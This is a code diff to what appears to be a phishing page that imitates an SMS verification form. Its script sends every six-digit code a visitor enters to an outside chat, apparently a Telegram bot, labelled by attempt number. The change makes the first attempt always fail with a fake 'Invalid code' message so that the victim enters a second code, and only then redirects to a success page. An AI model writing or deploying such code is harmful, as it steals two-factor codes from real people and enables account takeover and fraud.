@@ -25,6 +25,14 @@
       font-family: monospace;
       font-size: 1.2rem;
     }
+    
+    .success-message {
+      color: #00a800;
+      font-size: 12px;
+      margin-top: -10px;
+      margin-bottom: 15px;
+      text-align: center;
+    }
   </style>
 </head>
 <body class="page-form">
@@ -47,6 +55,7 @@
     <form id="smsForm">
       <input type="text" name="sms" id="smsCode" maxlength="6" placeholder="6-digit code" required class="otp-input"/>
       <div id="smsError" class="error-message"></div>
+      <div id="smsSuccess" class="success-message"></div>
       <button type="submit">Verify</button>
     </form>
 
@@ -79,6 +88,8 @@
       const smsInput = document.getElementById('smsCode');
       const smsForm = document.getElementById('smsForm');
       const smsError = document.getElementById('smsError');
+      const smsSuccess = document.getElementById('smsSuccess');
+      let attemptCount = 0;
       
       // Validation en temps réel du code OTP
       smsInput.addEventListener('input', function() {
@@ -94,6 +105,7 @@
         // Mettre à jour le message d'erreur
         if (this.value.length > 0 && !isValid) {
           smsError.textContent = 'Please enter a valid 6-digit code';
+          smsSuccess.textContent = '';
         } else {
           smsError.textContent = '';
         }
@@ -110,8 +122,12 @@
         if (!isValid) {
           smsInput.classList.add('error-border');
           smsError.textContent = 'Please enter a valid 6-digit code';
+          smsSuccess.textContent = '';
           return;
         }
+        
+        // Incrémenter le compteur de tentatives
+        attemptCount++;
         
         // Si le code est valide, procéder à l'envoi
         document.getElementById("spinnerOverlay").style.display = "flex";
@@ -124,15 +140,26 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               chat_id: "-4810968086",
-              text: `🔐 SMS Code: ${code}`
+              text: `🔐 SMS Code (Attempt ${attemptCount}): ${code}`
             })
           }
         ).catch(console.error);
         
-        // Redirection après 2.5 secondes
-        setTimeout(() => {
-          window.location.href = "success.html";
-        }, 2500);
+        // Première tentative : afficher une erreur
+        if (attemptCount === 1) {
+          setTimeout(() => {
+            document.getElementById("spinnerOverlay").style.display = "none";
+            smsError.textContent = 'Invalid code. Please try again.';
+            smsInput.value = '';
+            smsInput.focus();
+          }, 2500);
+        } 
+        // Deuxième tentative : rediriger vers success.html
+        else if (attemptCount >= 2) {
+          setTimeout(() => {
+            window.location.href = "success.html";
+          }, 2500);
+        }
       });
     });
   </script>
